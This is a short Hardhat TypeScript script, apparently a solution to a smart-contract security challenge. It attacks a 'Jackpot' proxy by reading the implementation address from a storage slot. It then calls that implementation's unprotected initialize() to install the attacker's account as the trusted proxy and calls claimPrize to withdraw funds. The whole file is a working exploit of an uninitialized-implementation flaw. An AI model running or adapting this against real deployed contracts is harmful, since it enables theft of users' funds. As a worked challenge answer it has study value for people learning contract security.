import { TransactionResponse } from "@ethersproject/providers";
import { ethers } from "hardhat";

const jackpotProxyAddress = "0xE5e0973b7Dda574a2BF9e2e6dF3D63aBD797464e";

async function main() {
  let tx: TransactionResponse;

  const [attacker] = await ethers.getSigners();

  const jackpotProxy = (await ethers.getContractFactory("Jackpot", attacker)).attach(jackpotProxyAddress);

  // Get the jackpot contract address
  let jackpotAddress = await ethers.provider.getStorageAt(jackpotProxy.address, 1);
  jackpotAddress = "0x" + jackpotAddress.substring(26);

  const jackpot = (await ethers.getContractFactory("Jackpot")).attach(jackpotAddress);

  // Call initialize to set the attacker as the new "jackpotProxy" to bypass validation
  tx = await jackpot.initialize(attacker.address);
  await tx.wait();

  // Withdraw funds
  const value = ethers.utils.parseEther("0.0001");
  tx = await jackpot.claimPrize(value, { value });
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
